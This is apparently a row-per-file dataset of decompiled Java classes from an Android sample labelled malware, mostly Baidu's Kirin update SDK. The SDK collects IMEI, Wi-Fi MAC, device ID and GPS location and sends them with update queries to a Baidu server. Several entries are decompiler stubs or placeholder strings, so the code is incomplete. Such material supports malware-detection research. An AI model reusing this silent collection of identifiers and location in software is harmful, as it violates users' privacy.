"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin\a.code","final class a implements Runnable {   final Context a;   final boolean b;   final CheckUpdateListener c;   public a(  Context context,  boolean z,  CheckUpdateListener checkUpdateListener){     this.a=context;     this.b=z;     this.c=checkUpdateListener;   }   @Override public void run(){     StatUpdateAgent.b(this.a,this.b,this.c);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin\b.code","final class b implements Runnable {   final Context a;   final int b;   final PostChoiceListener c;   public b(  Context context,  int i,  PostChoiceListener postChoiceListener){     this.a=context;     this.b=i;     this.c=postChoiceListener;   }   @Override public void run(){     StatUpdateAgent.b(this.a,this.b,this.c);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin\CheckUpdateListener.code","public interface CheckUpdateListener {   void checkUpdateResponse(  KirinCheckState kirinCheckState,  HashMap<String,String> hashMap); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin\KirinConfig.code","public class KirinConfig {   public static final String ATSETTING=""atSetting"";   public static final String ATSTART=""atStart"";   public static final String CLIENT_STATIC_DATA_FILE=""kirin_static_data_"";   public static final int CONNECT_TIME_OUT=3000;   public static final String DEFAULT_OPEN_PEROID=""00:00:00|23:59:59"";   public static final String KIRIN_MODULE_NAME=""/kirinsdk/"";   public static final String NO_RESULT=""N/A"";   public static final String POST_CHOICE=""/kirinsdk/updatecommit"";   public static final int READ_TIME_OUT=5000;   public static final String UPDATE_QUERY=""/kirinsdk/updatequery"";   public static boolean DEBUG_MODE=false;   public static int DEBUG=1;   public static int INFO=2;   public static int WARNING=3;   public static int ERROR=4;   public static int LOG_LEVEL=DEBUG;   public static int DEFAULT_UPDATE_INTERVAL=86400;   public static int DEFAULT_POP_INTERVAL=DEFAULT_UPDATE_INTERVAL * 7;   public static String PREURL=""http://tipsdk.baidu.com"";   public static int NO_YET_UPDATE=0;   public static int NOT_UPDATE=1;   public static int LATER_UPDATE=2;   public static int CONFIRM_UPDATE=3;   public static int FORCE_UPDATE=4; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin\PostChoiceListener.code","public interface PostChoiceListener {   void PostUpdateChoiceResponse(  JSONObject jSONObject); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin\StatUpdateAgent.code","public class StatUpdateAgent {   private static Handler b;   static HandlerThread a=new HandlerThread(""CheckUpdateManagerKirinAgent"");   private static JSONObject c=null;   private static JSONObject d=null;   private static JSONObject a(  Context context,  String str){     JSONObject jSONObject;     JSONException e;     if (com.baidu.kirin.b.a.a(context).a(str) || KirinConfig.DEBUG_MODE) {       d.a(""can update!"");       com.baidu.kirin.c.b bVar=new com.baidu.kirin.c.b(context,KirinConfig.UPDATE_QUERY);       bVar.a(""updateMoment"",str);       try {         JSONObject c2=bVar.c();         if (KirinConfig.DEBUG_MODE) {           c=bVar.a();           d=c2;         }         d.a(""updateResult is : "" + c2.toString());         try {           c2.put(""returncode"",bVar.d());           return c2;         }  catch (        JSONException e2) {           e2.printStackTrace();           return c2;         }       }  catch (      Exception e3) {         d.c(""send update query error!!"");         return null;       }     }     d.a(""can not update"");     try {       jSONObject=new JSONObject();     }  catch (    JSONException e4) {       jSONObject=null;       e=e4;     }     try {       jSONObject.put(""need_update"",""0"");       jSONObject.put(""returncode"",0);       if (!KirinConfig.DEBUG_MODE) {         return jSONObject;       }       c=new JSONObject();       c.put(""Send"",""didn't send request! at moment : "" + str);       d=jSONObject;       return jSONObject;     }  catch (    JSONException e5) {       e=e5;       e.printStackTrace();       return jSONObject;     }   }   private static void a(){     if (!a.isAlive()) {       a.start();       b=new Handler(a.getLooper());     }     if (b == null) {       b=new Handler(a.getLooper());     }   }   private static boolean a(  JSONObject jSONObject,  HashMap<String,String> hashMap){     try {       hashMap.put(""updatetype"",jSONObject.getString(""updatetype""));       hashMap.put(""note"",jSONObject.getString(""note""));       hashMap.put(""time"",jSONObject.getString(""time""));       hashMap.put(""appurl"",jSONObject.getString(""appurl""));       hashMap.put(""appname"",jSONObject.getString(""appname""));       hashMap.put(""version"",jSONObject.getString(""version""));       hashMap.put(""buildid"",jSONObject.getString(""buildid""));       hashMap.put(""attach"",jSONObject.getJSONArray(""attach"").toString());       return true;     }  catch (    JSONException e) {       e.printStackTrace();       return false;     }   }   public static void b(  Context context,  int i,  PostChoiceListener postChoiceListener){     if (com.baidu.kirin.b.a.a(context).c()) {       c cVar=new c(context,KirinConfig.POST_CHOICE);       cVar.a(""updateType"",i + """");       JSONObject c2=cVar.c();       if (postChoiceListener != null) {         postChoiceListener.PostUpdateChoiceResponse(c2);       }       if (KirinConfig.DEBUG_MODE) {         c=cVar.a();         d=c2;       }     }   }   public static void b(  Context context,  boolean z,  CheckUpdateListener checkUpdateListener){     KirinCheckState kirinCheckState;     JSONObject a2;     if (checkUpdateListener == null) {       return;     }     HashMap<String,String> hashMap=new HashMap<>();     KirinCheckState kirinCheckState2=KirinCheckState.ERROR_CHECK_VERSION;     try {       a2=z ? a(context,KirinConfig.ATSTART) : a(context,KirinConfig.ATSETTING);     }  catch (    Exception e) {       kirinCheckState=KirinCheckState.ERROR_CHECK_VERSION;       d.c(""Error checking online version: "" + e.getMessage());       e.printStackTrace();     }     if (a2 == null) {       d.c(""updateResult is null, net error!"");       checkUpdateListener.checkUpdateResponse(kirinCheckState2,new HashMap<>());       return;     }     int i=a2.getInt(""returncode"");     d.a(""updateQuery's retCode is : "" + i);     if (i != 0) {       d.b(""KirinSDK protocol error when mutual with backend"");       kirinCheckState=KirinCheckState.ALREADY_UP_TO_DATE;     }  else     if (Integer.parseInt(a2.getString(""need_update"")) != 1) {       kirinCheckState=KirinCheckState.ALREADY_UP_TO_DATE;     }  else     if (Integer.parseInt(a2.getString(""buildid"")) <= com.baidu.kirin.a.a.d(context)) {       kirinCheckState=KirinCheckState.ALREADY_UP_TO_DATE;     }  else {       if (!a(a2,hashMap)) {         checkUpdateListener.checkUpdateResponse(KirinCheckState.ALREADY_UP_TO_DATE,hashMap);         return;       }       if ("""".endsWith(a2.getString(""appurl"")) || a2.getString(""appurl"") == null) {         d.c(""appurl is null or appurl'size is 0!"");         kirinCheckState=KirinCheckState.ALREADY_UP_TO_DATE;       }  else       if (a2.getString(""appurl"").startsWith(""http://"")) {         kirinCheckState=KirinCheckState.NEWER_VERSION_FOUND;       }  else {         d.c(""appurl is not start with http://"");         kirinCheckState=KirinCheckState.ERROR_CHECK_VERSION;       }     }     checkUpdateListener.checkUpdateResponse(kirinCheckState,hashMap);   }   public static void checkUpdate(  Context context,  boolean z,  CheckUpdateListener checkUpdateListener){     a();     if (checkUpdateListener == null) {       com.baidu.mobstat.a.c.c(""sdkstat"",""The param of CheckUpdateListener is null, please new a instance of CheckUpdateListener"");     }  else {       b.post(new a(context,z,checkUpdateListener));     }   }   public static void postUserChoice(  Context context,  int i,  PostChoiceListener postChoiceListener){     a();     b.post(new b(context,i,postChoiceListener));   }   public static void setTestMode(){     KirinConfig.DEBUG_MODE=true;     KirinConfig.DEFAULT_UPDATE_INTERVAL=0;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin.a\a.code","!org.eclipse.jdt.core.dom.TypeDeclaration@10bdcca2"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin.b\a.code","public class a implements SharedPreferences.OnSharedPreferenceChangeListener {   private static SoftReference<a> a=null;   private final Context b;   private final SharedPreferences c=f().getSharedPreferences(f().getPackageName() + "".kirin_strategy_control_pref"",0);   private a(  Context context){     this.b=context.getApplicationContext();   }   public static synchronized a a(  Context context){     a aVar; synchronized (a.class) {       aVar=a == null ? null : a.get();       if (aVar == null) { synchronized (a.class) {           aVar=a == null ? null : a.get();           if (aVar == null) {             aVar=new a(context);             a=new SoftReference<>(aVar);           }         }       }     }     return aVar;   }   private boolean a(  String str,  String str2){     return c(str) > c(str2);   }   private int c(  String str){     return (Integer.parseInt(str.split("":"")[0]) * 60 * 60) + (Integer.parseInt(str.split("":"")[1]) * 60) + Integer.parseInt(str.split("":"")[2]);   }   private Context f(){     return this.b;   }   private boolean g(){     long time=new Date().getTime();     int i=this.c.getInt(""kirin_update_freqency"",-1);     long j=this.c.getLong(""kirin_strategy_record_time"",-1L);     if (j == -1) {       return true;     }     if ((time - j) / 1000 >= i) {       d.a(time + "" --> exceed interval : "" + i);       return true;     }     d.a(time + "" --> don't exceed interval : "" + i);     return false;   }   private boolean h(){     long time=new Date().getTime();     long j=this.c.getLong(""kirin_strategy_record_time"",-1L);     if (j == -1) {       return true;     }     if ((time - j) / 1000 > KirinConfig.DEFAULT_UPDATE_INTERVAL) {       d.a(time + "" --> exceed interval : "" + KirinConfig.DEFAULT_UPDATE_INTERVAL);       return true;     }     d.a(time + "" --> don't exceed interval : "" + KirinConfig.DEFAULT_UPDATE_INTERVAL);     return false;   }   private boolean i(){     throw new UnsupportedOperationException(""Method not decompiled: com.baidu.kirin.b.a.i():boolean"");   }   public void a(  boolean z,  JSONObject jSONObject){     long time=new Date().getTime();     SharedPreferences.Editor edit=this.c.edit();     if (z) {       try {         int i=jSONObject.getInt(""updateSwitch"");         int i2=jSONObject.getInt(""updateFrequency"");         int i3=jSONObject.getInt(""popFrequency"");         String string=jSONObject.getString(""openPeriod"");         d.a(""write to strategy controller data is  :  success : "" + z + ""; updateSwith : ""+ i+ ""; updateFrequency : ""+ i2+ ""; popFrequency : ""+ i3);         edit.putLong(""kirin_strategy_record_time"",time);         edit.putInt(""kirin_update_switcher"",i);         edit.putInt(""kirin_update_freqency"",i2 * 86400);         edit.putInt(""kirin_update_remind_freqency"",i3 * 86400);         edit.putString(""kirin_open_peroid"",string);       }  catch (      JSONException e) {         e.printStackTrace();         edit.putLong(""kirin_strategy_record_time"",time);         edit.putInt(""kirin_update_switcher"",0);         edit.putInt(""kirin_update_freqency"",KirinConfig.DEFAULT_UPDATE_INTERVAL);         edit.putInt(""kirin_update_remind_freqency"",KirinConfig.DEFAULT_POP_INTERVAL);         edit.putString(""kirin_open_peroid"",KirinConfig.DEFAULT_OPEN_PEROID);       }     }  else {       edit.putLong(""kirin_strategy_record_time"",time);       edit.putInt(""kirin_update_switcher"",0);       edit.putInt(""kirin_update_freqency"",KirinConfig.DEFAULT_UPDATE_INTERVAL);       edit.putInt(""kirin_update_remind_freqency"",KirinConfig.DEFAULT_POP_INTERVAL);       edit.putString(""kirin_open_peroid"",KirinConfig.DEFAULT_OPEN_PEROID);     }     edit.commit();   }   public boolean a(){     if (!i()) {       return false;     }     int i=this.c.getInt(""kirin_update_switcher"",-1);     if (!g() && i == 1) {       d.a(""!isExceedServerUpdateInterval() && switcher == 1"");       return false;     }     if (i == 0) {       d.a(""else if(switcher == 0)"");       return h();     }     d.a(""else!"");     return true;   }   public boolean a(  String str){     if (!i()) {       return false;     }     if (str.equals(KirinConfig.ATSTART)) {       return a();     }     if (str.equals(KirinConfig.ATSETTING)) {       return b();     }     return false;   }   public void b(  String str){     SharedPreferences.Editor edit=this.c.edit();     edit.putString(""kirin_log_id"",str);     edit.commit();   }   public boolean b(){     return i();   }   public boolean c(){     if (!i()) {       return false;     }     int i=this.c.getInt(""kirin_update_switcher"",-1);     return i == -1 || i == 1;   }   public String d(){     return this.c.getString(""kirin_log_id"",""0"");   }   public String e(){     return this.c.getString(""kirin_open_peroid"",KirinConfig.DEFAULT_OPEN_PEROID);   }   @Override public void onSharedPreferenceChanged(  SharedPreferences sharedPreferences,  String str){     if (sharedPreferences == this.c) {       d.a(str + "" : has changed"");     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin.c\a.code","public class a {   protected Context a;   protected String b;   protected String c;   protected JSONObject d;   protected JSONObject e;   protected boolean f;   private int g=-1;   public a(  Context context,  String str){     this.a=context;     this.b=KirinConfig.PREURL + str;     d.a(""PostUrl: "" + this.b);     this.d=new JSONObject();     try {       this.d.put(""appkey"",com.baidu.kirin.a.a.b(this.a));       this.d.put(""version_code"",com.baidu.kirin.a.a.d(this.a));       this.d.put(""version_name"",com.baidu.kirin.a.a.c(this.a));       this.d.put(""deviceid"",com.baidu.kirin.a.a.h(context));       this.d.put(""channel"",com.baidu.kirin.a.a.a(context));       this.d.put(""sdk_version"",CooperService.getMTJSDKVersion());       this.d.put(""sdk_tag"",""mtj"");     }  catch (    JSONException e) {       e.printStackTrace();     }     b();   }   public JSONObject a(){     return this.d;   }   public void a(  String str,  Object obj){     try {       this.d.put(str,obj);     }  catch (    JSONException e) {       e.printStackTrace();     }   }   protected void b(){   }   public org.json.JSONObject c(){     throw new UnsupportedOperationException(""Method not decompiled: com.baidu.kirin.c.a.c():org.json.JSONObject"");   }   public int d(){     return this.g;   }   protected void e(){   }   protected void f(){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin.c\b.code","public class b extends a {   private String g;   private JSONObject h;   private JSONObject i;   private JSONObject j;   private boolean k;   public b(  Context context,  String str){     super(context,str);     this.c=getClass().getName();   }   private JSONObject a(  Context context){     WifiManager wifiManager=(WifiManager)context.getSystemService(""wifi"");     LocationManager locationManager=(LocationManager)context.getSystemService(""location"");     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""appkey"",com.baidu.kirin.a.a.b(context));       jSONObject.put(""channel"",com.baidu.kirin.a.a.a(this.a));       jSONObject.put(""os_version"",com.baidu.kirin.a.a.e(context));       jSONObject.put(""manufacturer"",com.baidu.kirin.a.a.g(context));       jSONObject.put(""phone_type"",com.baidu.kirin.a.a.i(context));       jSONObject.put(""deviceid"",com.baidu.kirin.a.a.h(context));       jSONObject.put(""imei"",com.baidu.kirin.a.a.k(context));       jSONObject.put(""resolution"",com.baidu.kirin.a.a.m(context));       jSONObject.put(""platform"",""android"");       jSONObject.put(""is_mobile_device"",true);       jSONObject.put(""language"",Locale.getDefault().getLanguage());       jSONObject.put(""modulename"",CooperService.getPhoneModel());       jSONObject.put(""wifimac"",wifiManager.getConnectionInfo().getMacAddress());       jSONObject.put(""havegps"",locationManager != null);       jSONObject.put(""os_sdk"",com.baidu.kirin.a.a.f(context));       jSONObject.put(BasicStoreTools.DEVICE_CUID,com.baidu.kirin.a.a.j(context));     }  catch (    Exception e) {       e.printStackTrace();     }     d.a(""Satic Data : "" + jSONObject.toString());     return jSONObject;   }   private JSONObject b(  Context context){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""time"",com.baidu.kirin.a.a.a());       jSONObject.put(""version_name"",com.baidu.kirin.a.a.c(context));       jSONObject.put(""version_code"",com.baidu.kirin.a.a.d(context));       jSONObject.put(""network_type"",com.baidu.kirin.a.a.l(context));       jSONObject.put(""latlongitude"",com.baidu.kirin.a.a.a(context,CooperService.checkGPSLocationSetting(context)));     }  catch (    JSONException e) {       e.printStackTrace();     } catch (    Exception e2) {       e2.printStackTrace();     }     d.a(""Dyna Data : "" + jSONObject.toString());     return jSONObject;   }   private boolean g(){     this.g=KirinConfig.CLIENT_STATIC_DATA_FILE + this.a.getPackageName();     this.i=com.baidu.kirin.d.b.a(this.a,this.g);     if (this.i != null) {       this.h=a(this.a);       return !f.a(com.baidu.kirin.d.c.a(this.i.toString())).equals(f.a(com.baidu.kirin.d.c.a(this.h.toString())));     }     d.a(""Static file is empty, need collect static data!"");     this.h=a(this.a);     return true;   }   @Override protected void b(){     this.k=g();     try {       this.j=b(this.a);       this.d=com.baidu.kirin.d.c.a(this.d,this.h);       this.d=com.baidu.kirin.d.c.a(this.d,this.j);       if (this.k) {         d.a(""send new static data!"");         this.d.put(""isUpdateClientData"",""1"");       }  else {         d.a(""send cache static data!"");         this.d.put(""isUpdateClientData"",""0"");       }     }  catch (    Exception e) {       d.a(""what's going on?? : "" + e.toString());       e.printStackTrace();     }   }   @Override protected void e(){     d.a(""isInfoChanged : "" + this.k + ""  dump static data after success!!"");     if (this.k) {       try {         com.baidu.kirin.d.b.a(this.a,this.g,this.h);       }  catch (      IOException e) {         d.c(""Dump static file has exception!!"");         e.printStackTrace();       }     }     try {       com.baidu.kirin.b.a.a(this.a).a(true,new JSONObject(this.e.getString(""updateConfig"")));       com.baidu.kirin.b.a.a(this.a).b(this.e.getString(""logID""));     }  catch (    JSONException e2) {       e2.printStackTrace();       com.baidu.kirin.b.a.a(this.a).a(false,(JSONObject)null);       com.baidu.kirin.b.a.a(this.a).b(""0"");     }   }   @Override protected void f(){     if (com.baidu.kirin.a.a.o(this.a)) {       com.baidu.kirin.b.a.a(this.a).a(false,(JSONObject)null);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin.c\c.code","public class c extends a {   public c(  Context context,  String str){     super(context,str);     this.c=getClass().getName();   }   @Override protected void b(){     try {       this.d.put(""logID"",com.baidu.kirin.b.a.a(this.a).d());     }  catch (    Exception e) {       e.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin.d\a.code","public class a {   private static final char[] a=""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"".toCharArray();   private static final int[] b=new int[256]; static {     Arrays.fill(b,-1);     int length=a.length;     for (int i=0; i < length; i++) {       b[a[i]]=i;     }     b[61]=0;   }   public static final String a(  String str){     try {       return new String(a(str.getBytes(AsyncHttpResponseHandler.DEFAULT_CHARSET),false));     }  catch (    UnsupportedEncodingException e) {       System.err.println(""Base64 encoding error: "" + e.getMessage());       e.printStackTrace();       return null;     }   }   public static final char[] a(  byte[] bArr,  boolean z){     int length=bArr != null ? bArr.length : 0;     if (length == 0) {       return new char[0];     }     int i=(length / 3) * 3;     int i2=(((length - 1) / 3) + 1) << 2;     int i3=i2 + (z ? ((i2 - 1) / 76) << 1 : 0);     char[] cArr=new char[i3];     int i4=0;     int i5=0;     int i6=0;     while (i6 < i) {       int i7=i6 + 1;       int i8=i7 + 1;       int i9=((bArr[i7] & 255) << 8) | ((bArr[i6] & 255) << 16);       i6=i8 + 1;       int i10=i9 | (bArr[i8] & 255);       int i11=i5 + 1;       cArr[i5]=a[(i10 >>> 18) & 63];       int i12=i11 + 1;       cArr[i11]=a[(i10 >>> 12) & 63];       int i13=i12 + 1;       cArr[i12]=a[(i10 >>> 6) & 63];       i5=i13 + 1;       cArr[i13]=a[i10 & 63];       if (z && (i4=i4 + 1) == 19 && i5 < i3 - 2) {         int i14=i5 + 1;         cArr[i5]='\r';         cArr[i14]='\n';         i5=i14 + 1;         i4=0;       }     }     int i15=length - i;     if (i15 > 0) {       int i16=(i15 == 2 ? (bArr[length - 1] & 255) << 2 : 0) | ((bArr[i] & 255) << 10);       cArr[i3 - 4]=a[i16 >> 12];       cArr[i3 - 3]=a[(i16 >>> 6) & 63];       cArr[i3 - 2]=i15 == 2 ? a[i16 & 63] : '=';       cArr[i3 - 1]='=';     }     return cArr;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin.d\b.code","public class b {   public static JSONObject a(  Context context,  String str){     try {       FileInputStream openFileInput=context.openFileInput(str);       if (openFileInput == null) {         d.c(""Invalid jsonobject file "" + str);         return null;       }       StringBuffer stringBuffer=new StringBuffer();       byte[] bArr=new byte[4096];       while (true) {         int read=openFileInput.read(bArr);         if (read == -1) {           break;         }         stringBuffer.append(new String(bArr,0,read));       }       openFileInput.close();       if (stringBuffer.length() == 0) {         d.a(str + "" is empty! return null!"");         return null;       }       try {         return new JSONObject(stringBuffer.toString());       }  catch (      JSONException e) {         e.printStackTrace();         return null;       }     }  catch (    Exception e2) {       e2.printStackTrace();       return null;     }   }   public static void a(  Context context,  String str,  JSONObject jSONObject){     d.a(""File is: "" + str + ""; Content is: ""+ jSONObject.toString());     FileOutputStream openFileOutput=context.openFileOutput(str,0);     openFileOutput.write(jSONObject.toString().getBytes());     openFileOutput.flush();     openFileOutput.close();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin.d\c.code","public class c {   public static String a(  String str){     int i;     try {       JSONObject jSONObject=new JSONObject(str);       String[] strArr=new String[jSONObject.length()];       Iterator<String> keys=jSONObject.keys();       int i2=0;       while (keys.hasNext()) {         String next=keys.next();         try {           strArr[i2]=next + "":"" + jSONObject.getString(next);           i=i2 + 1;         }  catch (        JSONException e) {           e.printStackTrace();           i=i2;         }         i2=i;       }       Arrays.sort(strArr);       String str2=strArr[0];       for (int i3=1; i3 < strArr.length; i3++) {         str2=str2 + "", "" + strArr[i3];       }       return str2;     }  catch (    JSONException e2) {       d.b(""String to JSONObject error, return desc string!"");       e2.printStackTrace();       return str;     }   }   public static JSONObject a(  JSONObject jSONObject,  JSONObject jSONObject2){     JSONObject jSONObject3=new JSONObject();     Iterator<String> keys=jSONObject.keys();     while (keys.hasNext()) {       String next=keys.next();       try {         try {           jSONObject3.put(next,jSONObject.getString(next));         }  catch (        JSONException e) {           e.printStackTrace();         }       }  catch (      JSONException e2) {         e2.printStackTrace();       }     }     Iterator<String> keys2=jSONObject2.keys();     while (keys2.hasNext()) {       String next2=keys2.next();       try {         try {           jSONObject3.put(next2,jSONObject2.getString(next2));         }  catch (        JSONException e3) {           e3.printStackTrace();         }       }  catch (      JSONException e4) {         e4.printStackTrace();       }     }     return jSONObject3;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin.d\d.code","public class d {   public static String a=""KIRINUPDATE"";   public static String b=""kirin_update.log"";   private static Context c;   public static int a(  String str){     if (KirinConfig.DEBUG_MODE) {       a(d(str),null);     }     if (KirinConfig.LOG_LEVEL <= 1) {       return Log.d(a,d(str));     }     return 0;   }   public static int a(  String str,  Throwable th){     if (c == null) {       return 0;     }     try {       FileOutputStream openFileOutput=c.openFileOutput(b,32768);       StringBuilder sb=new StringBuilder();       sb.append(new SimpleDateFormat(""MM-dd hh:mm:ss.S"").format(new Date())).append(""\t"").append(d(str)).append(""\n"").append(Log.getStackTraceString(th));       byte[] bytes=sb.toString().getBytes(AsyncHttpResponseHandler.DEFAULT_CHARSET);       int length=bytes.length;       openFileOutput.write(bytes);       openFileOutput.close();       return length;     }  catch (    FileNotFoundException e) {       return 0;     } catch (    UnsupportedEncodingException e2) {       return 0;     } catch (    IOException e3) {       return 0;     }   }   private static String a(){     StackTraceElement[] stackTrace=Thread.currentThread().getStackTrace();     if (stackTrace == null) {       return null;     }     for (    StackTraceElement stackTraceElement : stackTrace) {       if (!stackTraceElement.isNativeMethod() && !stackTraceElement.getClassName().equals(Thread.class.getName()) && !stackTraceElement.getClassName().equals(""com.baidu.kirin.util.KirinLog"")) {         return ""["" + Thread.currentThread().getName() + ""(""+ Thread.currentThread().getId()+ ""): ""+ stackTraceElement.getFileName()+ "":""+ stackTraceElement.getLineNumber()+ ""]"";       }     }     return null;   }   public static int b(  String str){     if (KirinConfig.DEBUG_MODE) {       a(d(str),null);     }     if (KirinConfig.LOG_LEVEL <= 3) {       return Log.w(a,d(str));     }     return 0;   }   public static int c(  String str){     if (KirinConfig.DEBUG_MODE) {       a(d(str),null);     }     if (KirinConfig.LOG_LEVEL <= 4) {       return Log.e(a,d(str));     }     return 0;   }   private static String d(  String str){     String a2=a();     return a2 == null ? str : a2 + "" - "" + str;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin.d\e.code","public class e {   public boolean a;   public int b;   public String c;   public JSONObject d=null;   public int a(){     return this.b;   }   public void a(  int i){     this.b=i;   }   public void a(  String str){     this.c=str;     try {       this.d=new JSONObject(this.c);     }  catch (    JSONException e) {       d.c(""message to JSONObject error!! msg["" + this.c + ""]"");       e.printStackTrace();     }   }   public void a(  boolean z){     this.a=z;   }   public boolean b(){     return this.a;   }   public String c(){     return this.c;   }   public JSONObject d(){     if (this.d != null) {       return this.d;     }     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin.d\f.code","public class f {   public static String a(  String str){     try {       MessageDigest messageDigest=MessageDigest.getInstance(""MD5"");       messageDigest.update(str.getBytes());       byte[] digest=messageDigest.digest();       StringBuffer stringBuffer=new StringBuffer();       for (      byte b : digest) {         int i=b & 255;         if (i < 16) {           stringBuffer.append(""0"");         }         stringBuffer.append(Integer.toHexString(i));       }       return stringBuffer.toString();     }  catch (    NoSuchAlgorithmException e) {       d.c(""MD5Utility : getMD5 error"");       e.printStackTrace();       return """";     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin.d\g.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2771cdf0"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin.objects\CdmaCell.code","public class CdmaCell extends SCell {   public int networkId;   public int stationId;   public int systemId;   @Override public String toString(){     return this.cellType + "","" + this.MCCMNC+ "",""+ this.MCC+ "",""+ this.MNC+ """"+ this.stationId+ "",""+ this.networkId+ "",""+ this.systemId;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin.objects\GsmCell.code","public class GsmCell extends SCell {   public int CID;   public int LAC;   @Override public String toString(){     return this.cellType + "","" + this.MCCMNC+ "",""+ this.MCC+ "",""+ this.MNC+ """"+ this.LAC+ "",""+ this.CID;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin.objects\LatitudeAndLongitude.code","public class LatitudeAndLongitude {   public String latitude;   public String longitude; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.kirin.objects\SCell.code","public class SCell {   public int MCC;   public int MCCMNC;   public int MNC;   public String cellType;   public String toString(){     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.baidu.mobstat\a.code","class a implements Thread.UncaughtExceptionHandler {   private static a a=new a();   private Thread.UncaughtExceptionHandler b=null;   private Context c=null;   private a(){   }   public static a a(){     return a;   }   private void a(  long j,  String str,  String str2){     if (this.c == null || str == null || str.trim().equals("""")) {       return;     }     try {       JSONObject jSONObject=new JSONObject();       jSONObject.put(""t"",j);       jSONObject.put(""c"",str);       jSONObject.put(""y"",str2);       JSONArray b=b(this.c);       if (b == null) {         b=new JSONArray();       }       b.put(jSONObject);       FileOutputStream openFileOutput=this.c.openFileOutput(""__local_except_cache.json"",0);       openFileOutput.write(b.toString().getBytes());       openFileOutput.flush();       openFileOutput.close();       com.baidu.mobstat.a.c.a(""SDKCrashHandler"",""Save Exception String Successlly"");     }  catch (    Exception e) {       com.baidu.mobstat.a.c.a(""SDKCrashHandler"",e);     }   }   public void a(  Context context){     if (this.b == null) {       this.b=Thread.getDefaultUncaughtExceptionHandler();       Thread.setDefaultUncaughtExceptionHandler(this);     }     if (this.c == null) {       this.c=context.getApplicationContext();     }   }   public JSONArray b(  Context context){     JSONArray jSONArray=null;     if (context != null) {       File file=new File(context.getFilesDir(),""__local_except_cache.json"");       try {       }  catch (      Exception e) {         com.baidu.mobstat.a.c.a(""SDKCrashHandler"",e);       }       if (file.exists()) {         FileInputStream openFileInput=context.openFileInput(""__local_except_cache.json"");         StringBuffer stringBuffer=new StringBuffer();         byte[] bArr=new byte[1024];         while (true) {           int read=openFileInput.read(bArr);           if (read == -1) {             break;           }           stringBuffer.append(new String(bArr,0,read));         }         openFileInput.close();         jSONArray=stringBuffer.length() != 0 ? new JSONArray(stringBuffer.toString()) : null;         try {           file.delete();         }  catch (        Exception e2) {           com.baidu.mobstat.a.c.a(""SDKCrashHandler"",e2);         }       }     }     return jSONArray;   }   @Override public void uncaughtException(  Thread thread,  Throwable th){     String th2=th.toString();     String str="""";     if (th2 != null && !th2.equals("""")) {       try {         str=th2.length() > 1 ? th2.split("":"")[0] : th2;       }  catch (      Exception e) {         com.baidu.mobstat.a.c.b(e);         str="""";       }     }     if (str != null && !str.equals("""")) {       th2=str;     }     StringWriter stringWriter=new StringWriter();     PrintWriter printWriter=new PrintWriter(stringWriter);     th.printStackTrace(printWriter);     printWriter.close();     String obj=stringWriter.toString();     com.baidu.mobstat.a.c.a(""SDKCrashHandler"",obj);     a(System.currentTimeMillis(),obj,th2);     if (!this.b.equals(this)) {       this.b.uncaughtException(thread,th);     }     throw new RuntimeException(th);   } } "
